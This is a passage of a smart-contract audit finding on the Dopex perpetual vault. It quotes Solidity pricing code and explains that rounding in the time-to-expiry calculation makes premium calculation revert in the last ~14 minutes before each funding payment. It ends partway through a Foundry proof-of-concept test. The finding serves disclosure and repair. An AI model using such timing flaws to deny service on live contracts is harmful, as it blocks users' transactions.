class=\"mtk3\">// Check if vault has enough collateral to write the options</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">requiredCollateral</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">strike</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_validate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">requiredCollateral</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">perpetualAtlanticVaultLp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalAvailableCollateral</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">3</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Get total premium for all options being purchased</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">&gt;&gt;&gt; </span><span class=\"mtk12\">premium</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">calculatePremium</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strike</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// ... rest of operations</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>Inside this <code>calculatePremium</code>, it will get price from option pricing :</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L539-L551\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/perp-vault/PerpetualAtlanticVault.sol#L539-L551</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculatePremium</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_strike</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">premium</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">premium</span><span class=\"mtk1\"> = ((</span><span class=\"mtk11\">IOptionPricing</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">optionPricing</span><span class=\"mtk1\">).</span><span class=\"mtk11\">getOptionPrice</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_strike</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">_price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ? </span><span class=\"mtk12\">_price</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">getUnderlyingPrice</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">getVolatility</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_strike</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">timeToExpiry</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e8</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The provided <code>OptionPricingSimple.getOptionPrice</code> will use Black-Scholes model to calculate the price :</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/libraries/BlackScholes.sol#L33-L89\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/libraries/BlackScholes.sol#L33-L89</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">calculate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">optionType</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strike</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">riskFreeRate</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">volatility</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">S</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">price</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">X</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strike</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">T</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">36500</span><span class=\"mtk1\">) </span><span class=\"mtk3\">// 365 * 10 ^ DAYS_PRECISION</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">r</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">riskFreeRate</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10000</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">v</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">volatility</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">d1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ln</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">S</span><span class=\"mtk1\">, </span><span class=\"mtk12\">X</span><span class=\"mtk1\">)),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">r</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">v</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">v</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">)))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          ),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">T</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">v</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sqrt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">T</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">d2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sub</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">d1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk12\">v</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sqrt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">T</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">optionType</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">OPTION_TYPE_CALL</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUInt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_calculateCallTimeDecay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">S</span><span class=\"mtk1\">, </span><span class=\"mtk12\">d1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">X</span><span class=\"mtk1\">, </span><span class=\"mtk12\">r</span><span class=\"mtk1\">, </span><span class=\"mtk12\">T</span><span class=\"mtk1\">, </span><span class=\"mtk12\">d2</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DIVISOR</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">optionType</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">OPTION_TYPE_PUT</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUInt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">_calculatePutTimeDecay</span><span class=\"mtk1\">(</span><span class=\"mtk12\">X</span><span class=\"mtk1\">, </span><span class=\"mtk12\">r</span><span class=\"mtk1\">, </span><span class=\"mtk12\">T</span><span class=\"mtk1\">, </span><span class=\"mtk12\">d2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">S</span><span class=\"mtk1\">, </span><span class=\"mtk12\">d1</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ABDKMathQuad</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fromUInt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">DIVISOR</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>The problem lies inside <code>calculatePremium</code> due to not properly check if current time less than 864 seconds (around 14 minutes). because <code>getOptionPrice</code> will use time expiry in days multiply by 100.</p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/libraries/OptionPricingSimple.sol#L72\">https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/libraries/OptionPricingSimple.sol#L72</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">expiry</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">100</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">86400</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>If <code>nextFundingPaymentTimestamp() - block.timestamp</code> is less than 864 seconds, it will cause <code>timeToExpiry</code> inside option pricing is 0 and the call will always revert. This will cause an unexpected revert period around 14 minutes every funding epoch (in this case every week).</p>\n<p>Foundry PoC :</p>\n<p>Try to simulate <code>calculatePremium</code> when <code>nextFundingPaymentTimestamp() - block.timestamp</code> is less than 864 seconds.</p>\n<p>Add this test to <code>Unit</code> contract inside <code>/tests/rdpxV2-core/Unit.t.sol</code>, also add <code>import \"forge-std/console.sol\";</code> and <code>import {OptionPricingSimple} from \"contracts/libraries/OptionPricingSimple.sol\";</code> in the contract  :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testOptionPricingRevert</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">OptionPricingSimple</span><span class=\"mtk1\"> </span><span class=\"mtk12\">optionPricingSimple</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">optionPricingSimple</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">OptionPricingSimple</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk7\">5e6</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxRequired</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethRequired</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">rdpxV2Core</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">calculateBondCost</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getUnderlyingPrice</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// price of underlying wrt collateralToken</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">strike</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roundUp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">4</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// 25% below the current price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// around 14 minutes before next funding payment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">7</span><span class=\"mtk1\"> </span><span class=\"mtk12\">days</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">863</span><span class=\"mtk1\"> </span><span class=\"mtk12\">seconds</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">nextFundingPaymentTimestamp</span><span class=\"mtk1\">() -</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is the current price&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currentPrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is the strike&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strike</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;What is time to expiry&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk12\">timeToExpiry</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span 